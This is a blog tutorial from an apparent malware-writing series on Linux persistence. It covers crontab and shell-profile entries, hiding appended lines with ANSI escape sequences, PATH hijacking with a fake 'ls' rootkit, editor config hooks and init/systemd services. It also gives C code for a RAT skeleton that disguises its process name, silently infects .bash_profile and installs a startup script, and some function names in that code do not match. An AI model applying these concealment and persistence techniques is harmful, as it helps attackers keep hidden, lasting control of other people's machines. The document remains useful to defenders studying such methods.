# Programming for Wanabes XI. Persistence
We have already explored a little bit how to disguise our programs and now we are gonna look in the basics of ensuring that our program keeps running even in the event of a shutdown or reboot. This post is going to be more system administration than programming.... but that is what hacking is about... a little bit of everything.

# Persistence
So, let's define persistence as the capability of a program to restart execution whenever the program execution is stopped for whatever reason. When a computer switches off or reboots, all running software stops working. In the first case because the thing is switch off and just doesn't work :). In the second, because the reload of the operating system re-initialise all data structures and any trace of previous processes gets wiped out.

In the first case, depending on for how long the computer is switched off, even all the RAM memory will be physically deleted. Yes, the RAM memory is not as volatile as you may think. The contents remains for a while and there are some hardware attacks that exploits that (check [Cool Boot Attack](https://en.wikipedia.org/wiki/Cold_boot_attack).

Any way, those esoteric side cases are of little use for us, as we need to get our program executed in the normal OS. From that point of view, persistence is basically a two step process.

1. Store the program to execute somewhere in the system 
2. Force the system to execute such program at some point

# Storing our program

The places where we can store our program are kind of limited, however we can think on different levels as we will see in a second.

In a normal computer, persistent storage is roughly limited to the hard drive (either internal or external), in an embedded system we may have some EEPROM or Flash memory to write to.... and that is roughly it. Sometimes there are some internal flash on the processors itself that could be abused but those cases are too specific. Once you master the basics, the actual place to store your code will just be a matter of choice not a technical issue... and also a source of fun.

The place to store our program cannot really be anywhere.... We need to also fool the OS or other program to run it whenever it stops working. So it needs to be stored where it can be executed, at least part of it needs to be executed.

For instance, on embedded devices you will usually have write permission on the `/tmp` folder, but on a properly configured system, that folder will be mounted as `nonexec`, meaning that you cannot run programs stored on `/tmp`. You can temporally remount it without the `nonexec` flag, to run your program, but in order to do that from a reboot you first need to run some code from somewhere else, that actually does such a remount.

As you can imagine, a dropper can be of help here, so the main program is stored somewhere else (somewhere that doesn't allow direct execution) and the dropper will retrieve it and execute it. That location can be, the network, the cloud, an EEPROM, a disk sector marked as defective, code appended to a binary or a kernel module.

# Running the program
Once we manage to get the program stored somewhere in a way that it can be executed directly we need to make sure that it gets executed. For doing that we have multiple options that actually depends on how the system is configured and on which services it runs.

Note that, even when social engineer can help to get the malware executed in first place (and that is maybe the most common case), that won't rarely work to re-execute the malware after a reboot. I can think about a case to trick the user but not much more. In general, this process needs to be automatic. That's why it is better to get root permissions from the very beginning, that is, at the social engineering stage, when you may have a chance to trick the user to give you the permissions.... otherwise you may or may not be able to gain that permissions later.

So, I will talk about a few options to get programs executed automatically on start-up. This is basic system configuration and it is something that you need to do very often as a software engineer building computer-based solutions or as a regular system administrator... so nothing really hackish here....

The ways to get the program executed will depend on the permissions we have on the machine. Let's differentiate between user persistence and system-wide persistence.

# User Persistence
In case the application couldn't escalate privileges, it has to be run as a regular user, in that case, there are not many options. Actually I would say that we have just two.

The first one is the use of the command `@reboot` in the user `crontab`. You just need to add a line like this:

`@reboot /path_to_program/program`

Or 

`*/1 * * * *  /path_to_program/program`

For this to work you should first check that  `crond` is installed and running. Also the `@reboot` command seems not to work on all systems, at least for users. It works for `root` but whether it works for regular users depends on the version of `crond` installed by the system

The second option is to modify the startup scripts used by your shell. In this case you may need to first check which shell is being executed (usually just check the `SHELL` environmental var) and then patch the associated start-up script.

_Note that in this case, your code will only get executed whenever a user fires up a shell... not really at start-up_.

# Patching Bash
As an example I will use `bash` as that is my current shell and I'm too lazy to install three different ones and repeat the process for each one. I will describe the whole process in detail so you should get enough information to replicate this for any other shell. Be free to drop a comment indicating how you patch other shells. That may be useful for others.

The first thing you have to do is to figure out which files are used during the start up of a shell session. For that your best chance is to check the `man` page for your shell and look for `startup`  or `initialisation`. For bash you will find something like this:


       The  following paragraphs describe how bash executes its startup files.
	   (...)

       When bash is invoked as an interactive login shell, or as a  non-inter‐
       active  shell with the --login option, it first reads and executes com‐
       mands from the file /etc/profile, if that file exists.   After  reading
       that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile,
       in that order, and reads and executes commands from the first one  that
       exists  and  is  readable.  The --noprofile option may be used when the
       shell is started to inhibit this behavior.

       When an interactive login shell exits, or a non-interactive login shell
       executes  the  exit  builtin  command, bash reads and executes commands
       from the file ~/.bash_logout, if it exists.

       When an interactive shell that is not a login shell  is  started,  bash
       reads  and  executes  commands  from /etc/bash.bashrc and ~/.bashrc, if
       these files exist.  This may be inhibited by using the  --norc  option.
       The  --rcfile  file option will force bash to read and execute commands
       from file instead of /etc/bash.bashrc and ~/.bashrc.


Well, there are more info on the man page, but for us this is enough, we should just add our stuff on `~/.bash_profile`... Well, we should check which one of the files listed above exists and patch the appropriated one... All those files are themselves shell scripts so we just need to append some text to them to get the job done.

_NOTE: I'm oversimplifying the process here. You need to analyse in detail the process and proceed as per your needs. May be enough to patch one of those files, or you may need to patch all of them or create them if they do not exist._

# Hiding appended commands

I do not believe people looks into these files very often, unless they need to configure some fancy software that requires some special setup that is not performed automatically when the SW is installed... either defining some alias or adding some non-standard folder to the shell path. However, in case someone wants to take a look, we can try to hide a little bit our modification of the file (basically the line that executes the malware).

## Hiding commands with ANSI sequences

This is actually an old trick. The terminal application we use in our GNU/Linux system is actually a terminal emulator. It emulates the old physical terminal that connected to the computers usually through some serial port. As a heritage of those system, these terminal emulators are able to emulate many of those hardware devices like the VT-100 or the VT-200, thanks to the `termio` library/database. Those terminals supported the so-called escape sequences... that is, a special combination of data on the serial link that has a special meaning for the terminal.

Most of those sequences were intended to move the cursor around the screen or clean it... well, they can do more thing, but those are the things we are interested on.

So, most terminal emulators on your linux box will honour these escape sequences, at least at the extend of the terminal they are emulating (something set by the `TERM` environmental variable), and we can exploit this to avoid showing our modification, at least for some tools like `more` or `cat`. When using a normal text editor or more sophisticated programs like `less` the escape sequence will be shown, so this is not an universal solution, but may work for small files that are not usually edited...

Let's say we want to add the following command to the `.bash_profile` file:

```bash
$ echo 'echo "I am some harmless malware"'  >> ~/.bash_profile
$ cat ~./bash_profile
(...)
echo "I am some harmless malware"
$
```

Now, lets add the following escape sequence:

```bash
$  printf '#\033[1A\033[2K' >> ~/.bash_profile
$ cat ~./bash_profile
(...)
$
```

So what does that escape sequence does?

* First we start with a `#`. That is a comment for bash, so the script won't produce and error when executed.
* Then we find the first part of the sequence `\033[1A` which means that we want to move the cursor one line up (Note that `\033` is an octal value, remember those `0` at the left of the number, that represents the ESC ASCII code.)
* Then `\033[2K` means that we want to delete the entire line from the beginning

You can find a complete list of ANSI escape codes [here](https://en.wikipedia.org/wiki/ANSI_escape_code#CSI_(Control_Sequence_Introducer)_sequences).

So, whenever the terminal prints that line, will move the cursor one line up and delete that line... which is actually the previous line we added executing our code. Try to check the file with `cat` or `more` and the line will not be shown, but if you run the script it will indeed be executed.

## Other options
In addition to directly execute our program we can also try to either, get our program executed indirectly or cheat the user to execute it without noticing that, if you prefer. A way to do this is modifying the `PATH` variable adding as the first search folder one of our choice. Yes, the shell will look for binaries in the folders stored on `PATH` in order. Let's see how would this work.

```bash
$ mkdir ~/bin
$ echo "PATH=~/bin:$PATH" >> ~/.bash_profile
$ cd bin
$ cat << EOM >> ls
> #/bin/bash
> echo "I am malware"
> /bin/ls $@
> EOM
$ chmod +x ls
--- In a new session ---
$ ls ~/bin
I am malware
ls
$
```

_Note:A new session is required in order to process the modification on `.bash_profile`._

This is actually the simplest form of user space rootkit. In this case we are just showing a message but in the general case we can have some code checking the path passed as parameter and if it is the one where the malware is stored we just don't show it. Anyhow, as you can see, the fake `ls` just do its thing (showing a message here) and then calls the original `ls` at `/bin/ls`.... if you do not do that you go into an infinite loop showing the message "I am malware".

The `$@` shell variable contains all the parameters passed to the script... so we just pass them to the original `ls` to do its thing.

So, overall this is the idea. Then you can go further with this as much as you want.

Here are some exercises for you to have fun:

* Do the update above, change `ls` so it won't show some specific files you configure
* Also add versions of `cat`, `more`, `less` so when they get as parameter the `.bash_profile` file they do not show the `PATH` modification line
* Undo the change on `.bash_profile` whenever your program gets executed and redo it again when it is signaled to be destroyed or on `.bash_logout`
* Use `LD_PRELOAD` and use a shared library
* Provide your own dynamic linker

# Running your malware from other programs
In our previous example, we depend on the user running one of the programs we have faked. The main inconvenience of this technique is that our malware will not get executed immediately after reboot.... we will have to wait until the user runs one of the faked programs.

If that is an option, we can go more stealth just modifying other programs start-up scripts or configuration files. Let's see two examples.

Our first example will be Firefox. Firefox is one of the most widely used browsers. On my linux box, this is how it gets executed:

```
$ whereis firefox
firefox: /usr/bin/firefox /usr/lib/firefox /etc/firefox /usr/share/man/man1/firefox.1.gz
$ file  /usr/bin/firefox
/usr/bin/firefox: symbolic link to ../lib/firefox/firefox.sh
$ file /usr/bin/../lib/firefox/firefox.sh
/usr/bin/../lib/firefox/firefox.sh: POSIX shell script, ASCII text executable
```

In this case you will need root access to modify that script. Another problem is that this update will be gone when firefox gets updated, what happens very often. Again, it all depends on what the attacker is trying to achieve, sometimes only a few days or hours are needed...

The second example is exploiting programs configuration files. For this example I'll use `emacs`. Emacs configuration file can be found on the `$HOME` directory of the user and it is named `.emacs`.

The file `.emacs` is actually a [lisp](https://www.gnu.org/software/emacs/manual/html_node/elisp/) script executed by `emacs` on start-up. You can add a lot of capabilities there and add new behaviours to the editor. And one thing you can do is launch a process. In this case I will just launch `xeyes` together with `emacs`. 

```
$ echo '(call-process "/usr/bin/xeyes" nil 0 nil)' >> ~/.emacs
```

Note that for this to work you need an accessible X-Windows system, otherwise `xeyes` won't work. You can try something that doesn't need a window. As an example I will use `touch`, so you can also see how to pass parameters to your program:

```
$ echo '(call-process "touch" nil 0 nil "/tmp/test")' >> .emacs
$ ls /tmp/test
ls: cannot access '/tmp/test': No such file or directory
$ emacs &
$ $ ls /tmp/test
/tmp/test
```

There are other programs that allows you to run scripts that can launch external programs.... just explore what is available in the target system.

# The importance of non privileged users
In general, as a regular user you may not be able to run programs at start-up. To achieve that goal you may need to escalate your privileges, ideally getting `root` access. However, there may be other non privileged users that may be useful, depending on the final goal of the malware being developed.

For instance, many services in a machine are run by non-privileged users. Web services or databases servers very commonly use their own user, and those services are executed at start up, so in case one of those users is not properly protected they may give an attacker a chance to get code executed on start-up as a non-privileged user.

The process is the same we described before. Either you can run your code directly, or you can modify some configuration file to make the actual service run the code for your...

Right. Privilege escalation is not about getting root... is about getting privileges... any privilege.

# System-wide persistence
When it comes to get the program executed really on start up we have again a few options. These are, maybe, the more obvious ones:

* Modify `/etc/rc.local`. This file is the last one executed after boot. Anything on it will be executed just before the system is initiated.
* System V init scripts. On systems booting using the System V boot process, different scripts will be executed depending on the runlevel being initialised. 
* Systemd service. On system booting using the `sysmted`, new services can be added or modified to get code executed at start-up.

Let's dive into the details for the last two options.

# System V init

System V init system uses  scripts stored at `/etc/init.d` and for each runlevel it uses a folder named `rcN.d` where `N` is an integer indicating the `runlevel` (`man runlevel` to know more about this). In each of those folder you will fin a set of scripts named as:

* `SXX_name`. `S` stands for `start` and all scripts starting with `S` will be executed when entering the associated runlevel. `XX` is a number indicating the order of execution of each script. This way, `S10_apache` will run first than `S20_mysql`
* `KXX_name`. `K` stand for `kill`  and all scripts starting with `K`  will be executed when entering the runlevel (before the start scripts), killing all required processes for the transition. `XX` again allows to specify the order.

Usually the scripts to start and stop/kill a service are the same and they just use a parameter to determine what to do. So, all those `SXX_` and `KXX_` scripts are just links to the files stored in `/etc/init.d`. Which is very convenient because some services are used in many different runlevels.

So, if you can modify those folders/files you can just add the execution of your program, either in the script associated to one of the services or adding your own script and creating the associated link for the runlevels of interest for you.

# Systemd
Addind a systemd service is also very simple. Here, again, you can modify some of the existing services or create your own. In that case, we are back to the modification of `firefox` we discussed before.

Services are defined by simple text files stored in `/etc/systemd/system`. Overall the structure is like this:


    [Unit]
    Description=Description of the service
    
    [Service]
    User=root
    WorkingDirectory=Path to folder where the program is
    ExecStart=your code
    Restart=always
    
    [Install]
    WantedBy=multi-user.target


That is the bare minimum definition of a service. There are a lot more option you can use in each section. For that I will recommend to check the systemd official documentation.... some of them may actually be very useful.

Some comments tho. The `Restart` value will tell systemd what to do if the process dies. In our case we are saying that we want it to be restarted. The `multi-user.target` is the system target at boot that the service will relate to. Other option to this value is `graphical.target`.... somehow this related to System V runlevel 3 and runlevel 5.

Then, once the service is deployed you can just install it in the system running the command:

`systemctl enable malware`

That's it

# Companion Rootkit

Whenever the system is fully compromised, in addition to easily make a malware persistent you can also make it completely invisible, way further than the simple name change we did in the last instalment.

Having administrator privileges allows you to do whatever you want, so you can just drop a rootkit in the system. A rootkit is a tool or suite of tools (we talked about this a few sections before) intended to enable root access to the machine in the future, in a easy way and keep it (what implies hiding whatever program is deployed in the compromised system). It does this in two ways:

* Providing a backdoor to get into the machine directly
* Hiding that backdoor to the system tools so it cannot be detected

Original rootkits were just simple substitutions of the main administrator tools in the system. We have seen how this works when we talk about changing the bash `PATH` variable some section before. If you have `root` access you can just change the original program at `/bin/` or `/usr/bin`. This way, the attacker provides a `ps` program that does not show the rootkit programs, a `netstat` program that doesn't shows the connections of the rootkit programs, and an `ls` program that doesn't shows the files associated to the rootkit program.

You see now where the `KIT` part of the word comes from, don't you?

That worked fine in the old times when the number of tools for administrators were limited and well-known but when more and more tools become available, providing different versions of all of them was not a feasible solution. Then the next generation of rootkits appear. Those either try to hook into the system libraries or into the kernel, being these last ones the more powerful ones. They just go one level down, targeting the services used by all those new administration tools.

The more advanced user space rootkits take advantage of the fact that most binaries in modern system are dynamically linked. That allows an attacker to modify, either some key system library used by all tools (like the standard C library) or the dynamic linker that is in charge of loading the programs. This way, the rootkit can intercept the call to different library functions like `open` or `read`, and modify the values returned to any application using that libraries. Obviously, this doesn't work with statically linked binaries.

The kernel space rootkits goes even beyond and, actually do exactly the same thing, but just one level below, that is, they patch the associated systemcall instead of the library functions used by user space libraries. Kernel rootkits are hard to implement nowadays as the security in the kernel has improved a lot, but also because, on linux systems you get new kernel versions very often as part of your system updates that may break your kernel module.

In addition to that, a production machine intended to be secure shouldn't use kernel modules (or drivers if you prefer) and shouldn't allow either access to `/dev/mem` or `/dev/kmem`, devices that allows us to access directly the memory and patch the kernel directly in memory. So, even if you could patch the kernel (even the actual file on disk and wait for next reboot) or insert a module (something unlikely), there are chances that a future next kernel update will break your rootkit... As always, time opportunity is a key concept on malware.... If the attack is intended to take place in a short period of time, that is less of a concern.

Anyway, this is enough for rootkits for now. We may come back to this later as it is a topic on its own and can be seen as a side tool for a malware and not really as a intrinsic element of it.

# Going esoteric

We had described the more straightforward ways to get code executed after a reboot. There are more esoteric alternatives that I will just quickly mention here. Maybe some of you can try and come back with a side instalment for this series... or maybe I'll do that in future... Who knows.

* Using virus. A virus containing actually the RAT could be used to infect binaries in the system so, whenever such a binary is executed the RAT gets also executed. Compare this to the modification of the bash start-up file where we had to modify a file, try to hide the modification and then provide a wrapper script to do our thing. In case there is some binary owned by the user, we can just infect it with a virus that just launches the RAT
* Ramdisk. A linux system boots into Grub who then selects a kernel to be loaded and passes some parameters to it. Depending on how this kernel is configured it may get the initial code to execute from a ramdisk, either embedded in the kernel itself or as a separate file. An attacker could modify the kernel or the ramdisk to include the RAT there and get it executed at the very beginning of the system boot... even before systemd or System V scripts get executed.
* Network reinfection. We had already mentioned this when briefly talking about Duqu malware. In this case, a heavily networked environment is exploited to infect as many machines as possible in a way that, even when a machine is restarted, when it gets back on-line, at least one already infected machine is still running who will immediately infect any fresh machine just rebooted. This technique does not require storing any file in persistent storage... storage is actually a decentralised sharing network... done the hard way.

# Our RAT so-far
Enough theory, it is time to go on with our programming course. Let's take the code from the previous instalment and just refactor it a little bit.

```C
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int daemonize ()  {
  pid_t pid;
  
  if ((pid = fork()) != 0) return 0;
  setsid(); // Remove TTY
  if ((pid = fork()) != 0) return 0;
  return 0;
}

int payload () {
  while (1) {
    // C2C communication loop
    usleep (1000);
  }
}

int main (int argc, char *argv[]) {
  printf ("This is RAT0X0 version 0.1\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  daemonize (); 
  
  payload ();
}
```

From the learning point of view, it does not make much sense to implement every single technique we discussed above, but it is useful to implement the low level function required to use those techniques and that way we will keep learning about programming and how the system works.

The first we are going to do is to add a function that would implement the privilege escalation. For the time being it won't really do any privilege escalation, but will allow us to introduce a new system call `getuid`. It will look like this.

```C
#define USER_PERSISTENCE 0
#define SYS_PERSISTENCE  1

int escalate () {
  if (getuid () == 0) return SYS_PERSISTENCE;
#if 0
  extract_info ();
  if (find_exploit ()) {
    // Fire your zero-days here
    apply_exploit (); // This will actually run the RAT
	exit (1);         // so we are done
  }
#endif
  return USER_PERSISTENCE;
}
```

First, I defined two constants just to improve the readability of the code. Then, the function just checks if the user id is 0 (that means `root`). If that is the case it returns `SYS_PERSISTENCE`, meaning that we can apply one of the system-wide persistence techniques, or it returns `USER_PERSISTENCE` indicating that we can only aim for user persistence techniques.

I had added a basic pseudo-code for what the function should do. First the malware needs to extract information about the system , then find a suitable exploit based on that information and finally apply the exploit. Applying a exploit will usually imply (and that is what the code assumes) that the malware will be executed again as root... Then, when the `escalate` function is called again in that new execution, it will report that system persistence can be done, and actually become persistent.

Note that, in general, the malware will come with a few exploits implemented on it. This basically means than the `extract_info` function does not really needs to perform a complete enumeration of the system. It just need to check if the system is vulnerable to the exploits it carries.


# Applying user and system persistence
Now it is time update our `main` function. Let's first take a look to the new `main`:

```C
int main (int argc, char *argv[]) {
  int (*persistence[2])() = {persistence_user, persistence_root};

  printf ("This is RAT0X0 version 0.2\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  daemonize ();
  
  persistence [escalate ()]();
  payload ();
}
```


There are two new lines. The first one is one of those fancy C data types declarations that may look confusing at first glance. In case you get confused with a C declaration... always follow the rule: _Data types declarations are read inside out_.

```C
int (*persistence[2])()

 persistence[2]         : Array of two elements named persistence
 (*persistence[2])      : Array of two pointers to functions
 int (*persistence[2])(): Array to two pointers to functions 
                            returning int, and getting no parameter

```

It wasn't that hard after all, wasn't it?. We will see the functions `persistence_user` and `persistence_system` a bit later.

So, back to the pointers to functions. They allow us to point them to any function in our program and execute it. Let's see the second line we added to main:

```C
persistence [escalate ()]();
```

As you may remember, `escalate` will return `0` or `1` to indicate whether we are regular users or we have administrator permissions. The expression above, will select the first or the second element in the array of functions, that is `persistence_user` or `persistence_root`, and execute it, that is what the parenthesis at the end does (actually execute the function pointed by the pointer). In this case we are not passing parameters to the function so the parenthesis are empty.

# User persistence
Let's start implementing the user persistence. Let's implement the technique that modifies `.bash_profile`. The technique is not really important, what we are interested on is the code we need to write to interact with the files. This is something we haven't done yet. Most of the techniques we described above just require us to add some text to a file, so that is what we are going to learn first.

The user persistence function will look like this:

```C
int persistence_user () {
  if (is_modified ("./.bash_profile"))
    {
      append_str ("./.bash_profile", "echo \"I am some harmless malware\"\n");
      append_str ("./.bash_profile", "#\033[1A\033[2K\033[1A\n");
      append_str ("./.bash_profile", "PATH=$HOME/bin:$PATH\n");
      append_str ("./.bash_profile", "#\033[2K\033[1A\033[2K\010");
    }
  return 0;
}
```

We need two functions. The first one checks if the file has already been modified. We do not want to modify a file that was already modified, and make it grow bigger. The second just allows us to append a text string to the end of the file. You should recognise the strings we are appending.

_NOTE: The echo in the first `append_str` call shall actually be a call to the malware itself._

# Checking for modifications

In order to verify that the file we want to modify has not yet being modified, we are going to use a very simple test. We will just look for a control ASCII code in the file that you won't usually find on a shell script. I have chosen `\010` (_Data Line Escape_). Can you spot it at the end of the `persistent_user` function?. We could use the ESC character `\033` but it may be that the script uses itself escape sequences for colouring some data.

In order to do our check we need to do the following:

* Open the file
* Read the whole file looking for our mark
* Close the file

All file operations works like that. You always need to open the file and get a file descriptor. That is the number that will allow you to do things with the file. When you are done, you need to close the file identified by the file descriptor you got when you opened it. 

Not closing the file has two main consequences:

* First one is that the file descriptor is blocked. In this application it doesn't really matter, but in applications intended to work with thousands of files (or network connections... they are also identified with file descriptors) you may run out of file descriptors and get your application blocked. By default GNU/Linux limits the number of file descriptors a process can open simultaneously to 1024.
* Second, if you are writing to the file, in general, those changes won't be visible until you close the file (or alternatively you flush the buffers that is one of the things happening when closing a file).

_Note:Nowadays, files get closed automatically by the system when an applications ends... that was not always the case._

With all this information, let's write our check function:

```C
unsigned char is_updated (char *fname) {
  unsigned char buffer, res = 1;
  int len, fd = open (fname, O_RDONLY);
  do {
       if ((len = read (fd, &buffer, 1)) <= 0) break;
       if (buffer == '\010') {
	     printf ("- File %s already infected\n", fname);
		 res = 0;
	     break;
       }
     } while (1);
  close (fd);
  return res;
}
```

The first line declares our file descriptor (it is just an integer) and opens the file calling the `open` system call. This system call expects the name of the file as first parameter, and some flags. In this case, we are opening the file for reading (so, no issue flushing buffers).

Then, we go into an loop to read each byte in the file one by one using our well-known `read` syscall. The loop is pretty straightforward. If `read` returns a negative number (an error) or 0 (we reach the end of the file) we leave the loop, otherwise we keep reading until we find our mark.

Then we just close the file and return an indication of the result of the operation (0 modified, 1 not modified).

# System buffers
You may have heard that it is more efficient to read files in blocks, and that is true, so you may be wondering why I wrote the function reading the file byte by byte. Well, the reason is that the code is a bit simpler and therefore more convenient for our didactic purpose. Anyhow, in this case the difference is not that much. Let's see why.

A disk doesn't stores single bytes on its surface, instead, they read and write information in blocks. The original magnetic disks were organised in [sectors](https://en.wikipedia.org/wiki/Disk_sector) that traditionally had a size of 512 bytes. The disk was reading an writing in blocks of at least that size, and that was a physical constraint at the beginning because the disk has to actually spin to get the right position under the head (the device that actually reads and writes the data), and doing that for just one byte was not very efficient... Actually, as the disk was spinning, usually several consecutive sectors going down the head were read (all at the same distance from the centre)... that was usually known as a cluster (that were contained within the track... the whole ring at that distance). So, you can read a whole track if you read all the sectors for a complete disk spin.

Furthermore, storage devices use DMA (Direct Memory Access) for its data transfer. When you transfer data from the computer memory to/from a peripheral (a disk, for instance), you can do two things.

First, you write some code that writes the data you want to transfer into the peripheral (or reads from it). This is done either, using Input/Ouput instruction (i.e. `in/out` assembly instructions) or writing to specific memory regions mapped to the device. The use of one or other technique is a hardware-level decision (depends how the peripheral is hooked to the bus). In either case, the CPU has to get a word from memory and put it to the peripheral. The word is actually twice in the bus (from memory to CPU and from CPU to peripheral).

The second option uses DMA. In this case peripherals can directly access the memory without involving the CPU (either for read or write). DMA has different modes but in general it uses data blocks and not bytes (or words) for the transfer. Specifically disks use DMA to interchange data as part of the overall Input/Output management performed by the OS.

So, this is why it is better to work on buffers than on bytes. Said that, what really happens is that the operating system already knows all these details and it does the buffering for us (actually we don't have much control on any of these things from user space). 

When we ask the kernel to read a single byte from a file, it will actually read the whole sector (and likely consecutive ones) that contains that byte and just return us the byte we asked for. When we ask for the next byte in the file, the kernel knows that the associated sector is already cached in memory and will return the byte immediately without asking the hard drive to read again the sector.

However, note that the process above involves the transfer of one byte from kernel space to user space many times, which will actually introduce an overhead that may be mitigated reducing the number of transfers required (transferring buffers instead of bytes).

Anyhow, in this example the difference is not that big, but I'll show you the code for that case, for the sake of completeness.

```C
unsigned char is_updated (char *fname) {
  unsigned char buffer [1024];
  int len, i, res = 1, fd = open (fname, O_RDONLY);
  do {
    if ((len = read (fd, buffer, 1024)) <= 0) break;
    for (i = 0; i < len; i++)
      if (buffer[i] == '\010') {
	    printf ("File %s already infected\n", fname);
	    res = 0;
		break;
      }

  } while (1);
  close (fd);
  return res;
}
```

The function is pretty much the same, we just need and extra loop to inspect the buffer.

# Appending an String
To finish with our user persistence let's write a simple function to append a string at the end of a file. This is actually easier than it may look as the operating system allows us to open files to `APPEND` data which is actually what we need.

This is how `append_str` looks like:

```C
int append_str (char *fname, char *str) {
  int fd = open (fname, O_APPEND | O_WRONLY);
  write (fd, str, strlen (str));
  close (fd);
}
```

Nothing really special here. As we said, in order to interact with a file we need to open it and close it when we are done. In this case we are just writing the string passed as parameter. You surely notice the different flags used for `open` here. They are fully explanatory.... we want to append and also to write (we are not interested on reading from the file).

# Persistence root
For this case we are going to do the System V script modification. From a programming point of view there is no big difference as for all the other techniques we also need to create files or modify files, so it will be an interesting exercise for you to try to implement additional persistence solutions based on what we have learned here.

The code is once again very simple. Basic file manipulation with just a few tweaks that we will comment in a second.

```C
char script[] =
  "#!/bin/bash\n"
  "echo \"I'm malware\"\n"
  "# Doing bad things here";

int persistence_root () {
  create_from_str ("./init.d/malware", '5', script);
  return 0;
}
```


We have just added the malware script as a string in our program... you may want to obfuscate it.... but we will get to that later in this series.

Then the function to create the file and link it in the right [runlevel](https://en.wikipedia.org/wiki/Runlevel) (we chose 5 in this case for multi user graphical).

```C
int create_from_str (char *fname, char runlevel, char *str) {
  char target[1024] = "./rcX.d/S99malware";
  int fd = open (fname, O_CREAT | O_WRONLY, 0700);
  write (fd, str, strlen (str));
  close (fd);
  target[4] = runlevel;
  symlink (fname, target);
}
```

There are two main comments about this code:

* We are passing the `O_CREAT` flag to `open`. That will create the file in case it doesn't exist. We have also used the third optional parameter that allows us to specify the permissions. In this case we want our script to be executable so we can save a later call to `chmod`.
* The `symlink` system call just create a symbolic link... It works exactly the same than `ln -s origin target` in the command-line.

_NOTE:I'm creating all the files in my current development folder as I do not want to pollute my system and I'm being to lazy to setup some testing environment. Obviously, all path in the examples in this sections should start by `/etc/` and not by `./`._

# Running the malware directly
The code in previous section was kind of general, I just wanted to show you how to create and populate a file, as you may also need that for the `systemd` case. In reality, you will want to run your malware directly and not just a script that eventually launches it.

In this case, supposing the malware is already in the place you want it (and no dropper or further manipulation is needed in order to run it) we just need to do the link. The code will then be something like this:

```C
int persistence_root () {
  symlink ("/path_to_malware/malware", "./rc5.d/S99malware");
  return 0;
}
```

In this case, and assuming that we have chosen a fixed path to store the malware, we just need to create the symbolic link and we are done.

# Conclusions
In this instalment we have explored some of the options to get programs executed at start time, which is the way malware achieve persistence... but it is also something that you usually need to do when setting up computer systems. In other words, that is a normal system administration task.

We have implemented simple user and a system wide persistence solution in order to introduce how to work with files (getting to know the `open` syscall) and how to create symbolic links.

The rest of techniques may require a little bit more of effort as they may require the execution of some system tools (using `system` or if you prefer `fork+execv`) or even more complex code. For instance, in order to interact programmatically with `systemd` we need to connect to `dbus` which will add a big library dependency on the malware. In that case, it is better to use `execv` and invoke the system tool. For the `crontab` case, we just need to append a line to `/var/spool/cron/crontabs/user`... but for that you need root or crontab access.

There are many other ways to get code executed automatically in a system... Share your favourite ones in the comments!

# More

do ps -axe
See what programs are running and which ones can run sripts directely
RPC remote call?



# User presistence
bash_profile
crontab @reboot

vim/emacs rc https://www.emacswiki.org/emacs/ExecuteExternalCommand

gdbinit


# System-wide persistence
* /etc/rc.local
* System V init scripts
* systemd
https://www.linode.com/docs/guides/start-service-at-boot/


* root crontab
* Grub -> kernel patching.... ramdisks...

* Check for sudo... Attach process to existing session
  sudo -v -> extends sudo time... checks if sudo timeout is counting...
echo $$ -> PID of current shell



https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwj-tMC576rxAhWGA2MBHQgOBwkQFjAEegQIBxAE&url=http%3A%2F%2Fwww.cs.fsu.edu%2F~xyuan%2Fcop5570%2Flect7_session.ppt&usg=AOvVaw3f-OxXg7-Hkx3hba9Rwt-t

 process_vm_readv(2) and process_vm_writev(2);
 personality/ setarch


https://en.wikipedia.org/wiki/ANSI_escape_code
https://shiroyasha.svbtle.com/escape-sequences-a-quick-guide-1

 printf '\033[sHello\nBye\n\033[u\033[0J'
 
$ printf '\033[2D\033[s' >> test1.sh
$ echo "echo Hello" >> test1.sh
$ printf '\033[u\033[0J' >> test1.sh
 printf '#\033[1A\033[2K' >> test2.sh

# look for apps with the capability to run scripts passed as parameters or in a confiration fule

man stap

pkexec touch /root/foo.txt
gksu
https://askubuntu.com/questions/515292/how-to-get-gui-sudo-password-prompt-without-command-line

xdialog/zenity+
